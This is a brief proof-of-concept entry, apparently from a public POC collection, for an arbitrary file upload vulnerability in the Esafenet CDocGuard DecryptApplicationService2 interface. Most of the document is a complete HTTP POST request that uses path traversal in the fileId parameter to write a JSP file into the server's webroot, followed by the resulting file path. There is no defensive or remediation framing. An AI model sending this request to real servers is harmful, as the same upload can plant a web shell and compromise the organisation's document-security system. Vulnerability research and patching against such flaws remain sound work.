## 亿赛通DecryptApplicationService2接口任意文件上传


## poc
```
POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/pentest.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host:  IP：PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=B9964151074C71F115A9C803FFF05C34
Upgrade-Insecure-Requests: 1
Content-Length: 11

pentest
```

![351d9a1a384e83606b16d3e456e3e212](https://github.com/wy876/POC/assets/139549762/cd8b5019-1f4d-45e1-b89c-68ec7ad6ec74)

文件地址：`/CDGServer3/pentest.jsp`
